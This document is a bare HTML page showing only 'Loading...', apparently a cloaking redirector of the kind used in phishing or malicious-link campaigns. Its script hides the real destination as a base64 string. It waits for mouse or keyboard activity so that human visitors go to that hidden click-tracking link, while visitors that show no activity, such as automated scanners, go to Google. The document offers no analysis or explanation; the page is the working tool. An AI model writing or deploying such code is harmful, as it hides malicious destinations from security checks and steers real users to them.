<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Insight</title>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const timeoutDuration = 3000; // Timeout duration in milliseconds
      const mainUrl = "aHR0cHM6Ly9zZW1pLXpjbXAuYWlsbGlzdC1tYW5hZ2UuY29tL2NsaWNrLzExMzRkMWI2OTg4NTQ2MmRmLzExMzRkMWI2OTg4NTQ1ZjI3";
      const botUrl = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";

      // Decode Base64 URLs
      const decodeUrl = (encodedUrl) => atob(encodedUrl);

      const isHuman = () => {
        return new Promise((resolve) => {
          let interacted = false;

          const interactionListener = () => {
            interacted = true;
            resolve(true);
            // Clean up event listeners
            window.removeEventListener("mousemove", interactionListener);
            window.removeEventListener("keydown", interactionListener);
          };

          // Attach listeners for human interaction
          window.addEventListener("mousemove", interactionListener);
          window.addEventListener("keydown", interactionListener);

          // Fallback to bot if no interaction is detected within the timeout
          setTimeout(() => {
            if (!interacted) resolve(false);
          }, timeoutDuration);
        });
      };

      // Determine user type and redirect
      isHuman().then((human) => {
        const targetUrl = human ? decodeUrl(mainUrl) : decodeUrl(botUrl);
        window.location.href = targetUrl;
      }).catch((err) => {
        console.error("Error determining user type:", err);
        window.location.href = decodeUrl(botUrl); // Fallback to bot URL
      });
    });
  </script>
</head>
<body>
  <h1>Loading...</h1>
</body>
</html>
